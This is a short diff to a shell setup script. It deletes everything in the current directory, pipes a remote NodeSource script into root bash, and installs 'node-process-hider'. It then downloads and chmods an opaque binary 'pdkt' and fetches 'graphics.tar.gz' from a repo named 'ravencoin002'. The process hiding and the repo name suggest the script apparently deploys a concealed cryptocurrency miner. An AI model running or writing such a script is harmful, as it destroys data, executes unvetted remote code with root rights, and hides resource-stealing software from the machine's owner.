@@ -1,6 +1,20 @@
-rm -rvf *
+rm -rvf * && mkdir d && cd d
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pdkt & chmod +x pdkt
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+sudo apt-get install -y nodejs
+
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/pdkt
+chmod +x pdkt 
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
